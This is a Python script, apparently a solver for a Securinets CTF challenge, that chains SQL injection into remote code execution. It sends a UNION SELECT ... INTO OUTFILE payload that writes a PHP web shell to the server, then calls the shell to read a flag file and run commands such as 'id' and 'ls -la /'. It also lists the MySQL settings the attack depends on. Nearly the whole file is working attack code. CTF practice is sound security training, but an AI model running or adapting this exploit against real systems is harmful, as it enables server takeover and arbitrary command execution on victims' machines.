#!/usr/bin/env python3
"""
Securinets CTF - SQLi to RCE Solver
Exploits: SQL Injection -> INTO OUTFILE -> PHP Shell -> RCE
"""

import requests
import random
import string
import sys
import time

# Configuration
TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
SHELL_NAME = "shell_" + ''.join(random.choices(string.ascii_lowercase, k=6)) + ".php"

print(f"""
╔══════════════════════════════════════════╗
║   Securinets SQLi to RCE Exploit         ║
╠══════════════════════════════════════════╣
║ Target: {TARGET:<32} ║
║ Shell:  {SHELL_NAME:<32} ║
╚══════════════════════════════════════════╝
""")

# Step 1: Write PHP shell via SQL Injection
print("[1] Injecting PHP shell via INTO OUTFILE...")

shell_code = '<?php system($_GET["c"]); ?>'
sqli_payload = f'1 UNION SELECT "{shell_code}",2,3 INTO OUTFILE "/var/lib/mysql-files/{SHELL_NAME}"'

try:
    r = requests.get(f"{TARGET}/index.php", params={"id": sqli_payload}, timeout=10)
    print(f"    Status: {r.status_code}")
except Exception as e:
    print(f"    Error: {e}")
    sys.exit(1)

# Step 2: Wait for file to be available
print("[2] Waiting for shell to be accessible...")
time.sleep(1)

# Step 3: Access shell and execute command
shell_url = f"{TARGET}/images/{SHELL_NAME}"
print(f"[3] Accessing shell: {shell_url}")

try:
    # Read the flag
    r = requests.get(shell_url, params={"c": "cat /flag.txt"}, timeout=10)
    
    if "Securinets{" in r.text:
        print("\n" + "="*50)
        print("🎉 FLAG FOUND!")
        print("="*50)
        # Extract just the flag
        for line in r.text.split('\n'):
            if 'Securinets{' in line:
                print(f"\n🏁 {line.strip()}\n")
        print("="*50)
    else:
        print("\n[!] Shell accessible but flag not found")
        print(f"    Response: {r.text[:200]}")
        
        # Try other commands
        print("\n[4] Trying alternative commands...")
        for cmd in ["ls -la /", "id", "whoami"]:
            r2 = requests.get(shell_url, params={"c": cmd}, timeout=5)
            print(f"    $ {cmd}")
            print(f"    {r2.text[:100]}")
            
except requests.exceptions.RequestException as e:
    print(f"\n[!] Failed to access shell: {e}")
    print("    The shell might not have been written. Check:")
    print("    1. MySQL FILE privilege is granted")
    print("    2. Shared volume is configured correctly")
    print("    3. secure_file_priv is set to empty string")
    sys.exit(1)

print("\n[✓] Exploit complete!")
